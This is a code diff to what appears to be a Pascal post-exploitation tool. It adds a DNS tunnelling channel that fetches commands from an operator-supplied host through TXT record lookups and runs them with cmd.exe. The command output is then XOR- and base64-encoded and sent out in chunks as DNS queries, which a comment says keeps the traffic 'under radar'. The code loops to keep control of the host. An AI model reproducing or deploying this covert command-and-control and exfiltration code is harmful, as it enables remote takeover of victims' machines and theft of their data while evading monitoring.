@@ -40,7 +40,7 @@ uses
   {$ENDIF}{$ENDIF}
   Classes, SysUtils, CustApp, WinSock, windows, process, JwaWinSvc, services,
   strutils, FileUtil, core, base64, jsonparser, fpjson,
-  lconvencoding, netenum, wmi, exploitchecker,WinInet;
+  lconvencoding, netenum, wmi, dnssend,exploitchecker,WinInet;
 
 const
    // users privielges levels
@@ -120,9 +120,13 @@ type
     procedure ex_code;virtual;
     procedure remote_lib;virtual;
     procedure agent_bidirectional;virtual;
+    procedure dns;virtual;
+    procedure TXTvalueQuery;virtual;
   end;
 
-
+var
+  status : boolean; // boolean value for dns code function only
+  i_host : string;
 { Tmongoose }
  
 function CreateProcessWithLogonW(lpUsername: PWideChar; lpDomain: PWideChar;
@@ -140,7 +144,7 @@ var
   ErrorMsg: String;
 begin
   // quick check parameters
-  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote ssl eval', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
+  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote ssl eval', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce dns');
   if ErrorMsg<>'' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -221,6 +225,9 @@ begin
   if hasoption('remote') then begin
   remote_lib;
   end;
+  if hasoption('dns') then begin
+  dns;
+  end;
   if hasoption('m','mongoose') then begin
      systeminfo;
      userinfo;
@@ -257,27 +264,7 @@ begin
    end;
    temp.Free;
  end;
-{* Revoked
-function fetchplugin(path:string):string;
-var
-  FPHTTPClient: TFPHTTPClient;
-  Resultget : string;
-begin
-InitSSLInterface;
-FPHTTPClient := TFPHTTPClient.Create(nil);
-FPHTTPClient.AllowRedirect := True;
-   try
-   Resultget := FPHTTPClient.Get(path); // test URL, real one is HTTPS
-   fetchplugin := Resultget;
 
-   except
-      on E: exception do
-         writeln(E.Message);
-   end;
-FPHTTPClient.Free;
-
-end;
- }
 function Base64Tofile(const AFile, Base64: String): Boolean;
 var
   MS: TMemoryStream;
@@ -345,6 +332,191 @@ var
  ind := Copy(cmd, Succ(splitat), Length(cmd));
  result:= ind;
  end;
+
+
+function traffic_Seg(const data:string):string;   // send every chunk with separated request in order to be under radar
+var
+  tmp_list : Tstringlist;
+  DNSd: TDNSsend;
+begin
+  DNSd := TDNSSend.Create;
+  tmp_list := Tstringlist.create;
+  try
+  DNSd.TargetHost := i_host;
+  DNSd.DNSQuery(data+'.'+i_host, QTYPE_MX, tmp_list);
+
+  finally
+    DNSd.Free;
+  end;
+
+end;
+
+procedure Tmongoose.TXTvalueQuery;
+var
+  l:tstringlist;
+  DNSd: TDNSSend;
+begin
+  status := false;
+  DNSd := TDNSSend.Create;
+  l := Tstringlist.create;
+  DNSd.TargetHost := i_host;
+  sleep(1000);
+  DNSd.DNSQuery('test.'+i_host, QTYPE_TXT, l);
+  if length(l.text) > 0 then begin
+    DNSd.DNSQuery('test.'+i_host, QTYPE_AAAA, l)
+  end else
+  status := true;
+end;
+
+// thanks to : https://forum.lazarus.freepascal.org/index.php?topic=33743.0
+procedure XorCrypt(Var Buffer; Const Len: Cardinal; Const Key: String);
+Var PB: ^Byte;
+    I, II: Cardinal;
+Begin
+  PB:= @Buffer;
+  II:= 1;
+  For I:= 0 To Len - 1 Do Begin
+    PB^:= PB^ Xor Byte(Key[II]);
+    Inc(PB);
+    Inc(II);
+    If II > Length(Key) Then II:= 1;
+  End;
+End;
+
+Function XorEncodeBase64(Const What, Key: String): String;
+Var P: Pointer;
+    L: Cardinal;
+    M: TMemoryStream;
+Begin
+  //Uses Base64 for encoding
+  L:= Length(What);
+  GetMem(P, L);
+  Try
+    Move(What[1], P^, L);
+    XorCrypt(P^, L, Key);    // xoring
+    M:= TMemoryStream.Create;
+    Try
+      With TBase64EncodingStream.Create(M) Do Try
+        Write(P^, L);
+      Finally
+        Free;
+      End;
+      SetString(Result, PAnsiChar(M.Memory), M.Size);
+    Finally
+      M.Free;
+    End;
+  Finally
+    FreeMem(P);
+  End;
+End;
+
+ Function XorDecodeBase64(Const What: String): String;
+Var P: Pointer;
+    L: Cardinal;
+    M: TMemoryStream;
+    key:string;
+Begin
+  //Uses Base64
+  key := '0xsp.com';
+  M:= TMemoryStream.Create;
+  Try
+    M.Write(What[1], Length(What));
+    M.Position:= 0;
+    GetMem(P, M.Size);
+    Try
+      With TBase64DecodingStream.Create(M) Do Try
+        L:= Read(P^, M.Size);
+        XorCrypt(P^, L, Key);
+        SetString(Result, PAnsiChar(P), L);
+      Finally
+        Free;
+      End;
+    Finally
+      FreeMem(P);
+    End;
+  Finally
+    M.Free;
+  End;
+End;
+
+function TestXorBase64(s:string):string;
+Var  Key, B64: String;
+Begin
+
+  Key:= '0xsp.com'; //default password for xor encryption
+  B64:= XorEncodeBase64(S, Key);
+ result := B64;
+
+End;
+
+function exfiltrate(str:string):string;
+var
+  NumElem, i ,Len:Integer;
+  Arr: array of String;
+begin
+     Len := Length(str);
+    // Calculate how many full elements we need
+    NumElem := Len div 30;
+    // Handle the leftover content at the end
+    if Len mod 10 <> 0 then
+      Inc(NumElem);
+      SetLength(Arr, NumElem);
+
+    // Extract the characters from the string, 10 at a time, and
+    // put into the array. We have to calculate the starting point
+    // for the copy in the loop (the i * 30 + 1).
+    for i := 0 to High(Arr) do
+      Arr[i] := Copy(Str, i * 30 + 1, 30);
+
+   // Send data into DNS server as Chunks
+   for i := 0 to High(Arr) do begin
+
+
+  traffic_Seg(TestXorBase64(Arr[i]));
+  writeln('[+]Shell command results has been sent -> ');
+end;
+
+end;
+
+procedure Tmongoose.dns;
+var
+  p2: tstringlist;
+  str: string;
+  DNSd: TDNSSend;
+  y: Integer;
+
+begin
+
+  for y := 1 to paramcount do begin
+      if (paramstr(y)='-srvhost') then begin
+        i_host := paramstr(y+1);
+      end;
+
+  end;
+  writeln(i_host);
+  status := false;
+  p2 := Tstringlist.Create;
+  TXTvalueQuery;   // Query an active dns server for txt value to pass as valid command
+  DNSd := TDNSSend.Create;
+  DNSd.TargetHost := i_host;
+
+  if DNSd.DNSQuery('live.'+i_host, QTYPE_TXT, p2) then
+   writeln(length(p2.text)); // length of accepted DNS query
+   if length(p2.text) > 1 then
+  writeln('[+] Yo! Command captured  <-'+p2.text);
+   {$IFDEF Windows} // for windows env
+  RunCommand(systemfolder+'\cmd.exe',['/c',p2.text],str);
+   {$IFEND}
+
+  exfiltrate(str); // send command results into dns server
+  status := true; // Bool value
+ while status do begin    // loop case
+
+     DNS
+
+ end;
+
+end;
 
 procedure Tmongoose.networkdiscovery;
 var
